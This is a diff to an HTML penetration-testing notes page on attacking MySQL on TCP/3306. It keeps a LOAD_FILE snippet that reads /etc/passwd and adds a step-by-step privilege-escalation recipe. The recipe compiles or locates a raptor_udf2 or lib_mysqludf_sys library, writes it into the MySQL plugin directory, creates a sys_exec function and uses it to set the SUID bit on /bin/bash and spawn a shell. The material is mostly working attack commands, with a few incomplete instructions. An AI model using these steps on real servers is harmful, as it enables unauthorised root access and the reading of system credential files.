@@ -19,7 +19,7 @@
 
     <div class="notion-container">
         <div class="notion-header">
-            <h1>Mysql (TCP/3306)</h1>
+            <h1>MySQL (TCP/3306)</h1>
             <p>MySQL is an open source relational database management system (RDBMS) that's used to store and manage data</p>
         </div>
         <div class="notion-body">
@@ -56,8 +56,53 @@
                     <p>In case you are dealing with a <b>WAMP</b> server the default path is <b>C:\wamp\www\</b></p>
                 </ul>
                 <h3>File read</h3>
-                <p>In case you have the READ permissions you are able to read system files by doing</p>
-                <pre><code class="language-sql">select LOAD_FILE("/etc/passwd");</code></pre>
+                <ul>
+                    <p>In case you have the READ permissions you are able to read system files by doing</p>
+                    <pre><code class="language-sql">select LOAD_FILE("/etc/passwd");</code></pre>
+                </ul>
+
+                <h3>Privilege escalation</h3>
+                <ul>
+                    <p>In case you see that mysql is running with elevated privileges you may be able to escalate your privileges abusing User-defined functions(UDF) library</p>
+                    <h4>Option 1: Using RAPTOR_UDF library</h4>
+                    <ul>
+                        <p>First get the library file from <a href="https://github.com/ankh2054/MySQL-UDF/blob/master/raptor_udf2.c" class="notion-link">here</a> </p>
+                        <p>Situate the file inside the target machine and compile it using the following commands:</p>
+                        <pre><code class="language-bash">gcc -g -c raptor_udf2.c
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</code></pre>
+                        <p>The output file will be `raptor_udf2.so`. Now type the following commands to load the UDF file</p>
+                        <p>Transfer it to the machine</p>
+                    </ul>
+
+                    <h4>Option 2: Using SQL/Metasploit library</h4>
+                    <ul>
+                        <p>We can use an already compiled library, use the following command</p>
+                        <pre><code class="language-bash">locate "*lib_mysqludf_sys*"</code></pre>
+                        <p>Grab one of the files which ends with <b>.so</b> select it according to the arch of the target machine</p>
+                        <p>Transfer it to the machine</p>
+                    </ul>
+                    <p>Now follow the process with the selected file</p>
+                    <pre><code class="language-sql">mysql -u root -p
+
+use mysql;  
+
+create table npn(line blob);
+
+insert into npn values(load_file('/var/www/raptor_udf2.so'));   #In case you see an error which says file too short try to change the directory where you situate the file
+
+show variables like '%plugin%';                                 #Check the plugin directory and place it in the next command
+
+select * from npn into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+
+create function sys_exec returns integer soname 'raptor_udf2.so';
+
+select * from mysql.func  #Check if the function is created
+
+select sys_exec('chmod +s /bin/bash');  #Use the function to execute commands
+
+\! sh  #You can even use the command to setup a shell from inside the mysql and check the results
+</code></pre>
+                </ul>
             </ul>
             
 
